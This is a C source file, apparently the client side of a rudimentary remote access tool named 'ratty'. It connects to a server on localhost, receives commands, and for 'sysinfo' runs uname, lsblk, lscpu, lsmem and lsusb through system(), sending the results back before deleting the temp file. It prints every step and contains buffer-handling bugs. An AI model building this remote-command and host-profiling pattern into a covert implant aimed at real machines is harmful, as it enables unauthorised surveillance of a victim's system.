#include "ratty.h"

int main(int argc, char *argv[])
{
    int bytes, serv_len, sock;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        _dumperr("main->socket()");

    serv_len = sizeof(serv_addr);

    bzero((char *) &serv_addr, serv_len);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (!(inet_aton("127.0.0.1", &serv_addr.sin_addr)))
        _dumperr("main->inet_aton()");

    int not_connected = 1;

    do {
        if (connect(sock, (struct sockaddr *) &serv_addr, serv_len) >= 0) {
            not_connected = 0;
        }
        else {
            fprintf(stdout, YLW_CLR"Client:"DEF_CLR" connection refused...\n");
            sleep(1);
        }
    } while (not_connected);

    fprintf(stdout, YLW_CLR"Client:"DEF_CLR" connected!\n");

    // Ping-pong to check
    char chkmsg[BUFSIZ];

    if ((bytes = recv(sock, chkmsg, BUFSIZ, 0)) < 0)
        _dumperr("main->recv()");
    _chkbytes("recv", bytes);

    fprintf(stdout, YLW_CLR"Client:"DEF_CLR" checkmsg -- %s\n", chkmsg);

    if ((bytes = send(sock, chkmsg, BUFSIZ, 0)) < 0)
        _dumperr("main->send()");
    _chkbytes("send", bytes);

    // Start client routine
    if (client_routine(sock) < 0)
        _dumperr("client_routine()");

    close(sock);

    return 0;
}

int client_routine(int sock)
{
    int bytes, connected = 1;

    do {
        char *cmd = malloc(sizeof(char) * SERVER_CMD_SIZE);

        // Get the command
        if ((bytes = recv(sock, cmd, SERVER_CMD_SIZE, 0)) < 0)
            _dumperr("client_routine->recv()");
        _chkbytes("recv", bytes);

        fprintf(stdout, YLW_CLR"Client:"DEF_CLR" server command -- %s\n", cmd);

        if (strcmp(cmd, "sysinfo") == 0) {
            grab_system_info(sock);
        }
        else if (strcmp(cmd, "disconnect") == 0) {
            connected = 0;
        }
        else {
            fprintf(stdout, YLW_CLR"Client:"DEF_CLR" unrecognized command (%s)\n", cmd);
        }

        free(cmd);

    } while (connected);

    return 0;
}

int grab_system_info(int sock)
{
    int bytes;
    char *filename = "sysinfo_client.txt";

    char *cmd = malloc(sizeof(char) * SYSINFO_CMD_SIZE);

    sprintf(cmd, "echo '\n ~~~ OS INFO ~~~\n' > %s "
                "&& uname -a >> %s "
                "&& echo '\n ~~~ BLK INFO ~~~\n' >> %s "
                "&& lsblk >> %s"
                "&& echo '\n ~~~ CPU INFO ~~~\n' >> %s "
                "&& lscpu >> %s"
                "&& echo '\n ~~~ MEM INFO ~~~\n' >> %s "
                "&& lsmem >> %s"
                "&& echo '\n ~~~ USB INFO ~~~\n' >> %s "
                "&& lsusb >> %s",
                filename, filename, filename, filename, filename,
                filename, filename, filename, filename, filename
            );

    fprintf(stdout, "shell cmd: %s\n", cmd);
    system(cmd);

    char *buf = malloc(sizeof(char) * BUFSIZ);

    if ((bytes = _readfile(filename, buf)) < 0)
        _dumperr("grab_system_info->_readfile()");
    _chkbytes("fread", bytes);

    if ((bytes = send(sock, buf, BUFSIZ, 0)) < 0)
        _dumperr("grab_system_info->send()");
    _chkbytes("send", bytes);

    sprintf(cmd, "rm %s", filename);

    fprintf(stdout, "shell cmd: %s\n", cmd);
    system(cmd);

    free(cmd);
    free(buf);

    return 0;
}

void _chkbytes(char *str, int bytes)
{
    fprintf(stdout, YLW_CLR"Client:"DEF_CLR" %s %d bytes\n",
        str, bytes);
}

void _clrscr(void)
{
    fprintf(stdout, "\033[H\033[2J");
}

void _dumperr(char *str)
{
    fprintf(stderr, RED_CLR"Client:"DEF_CLR" error occured -- %s", str);
    exit(EXIT_FAILURE);
}

void _flush(void)
{
    while (getchar() != '\n') {}
}

int _readfile(const char *filename, char *buf)
{
    int size;

    FILE *fp;

    if ((fp = fopen(filename, "r")) == NULL)
        return -1;

    fseek(fp, 0L, SEEK_END);
    size = ftell(fp);
    rewind(fp);

    if (fread(buf, sizeof(char), size, fp) != size)
        return -1;

    fclose(fp);

    return size;
}

int _writefile(const char *filename, char *buf)
{
    int size;

    FILE *fp;

    if ((fp = fopen(filename, "w")) == NULL)
        return -1;

    size = strlen(buf);

    if (fwrite(buf, sizeof(char), size, fp) != size)
        return -1;

    fclose(fp);

    return size;
}
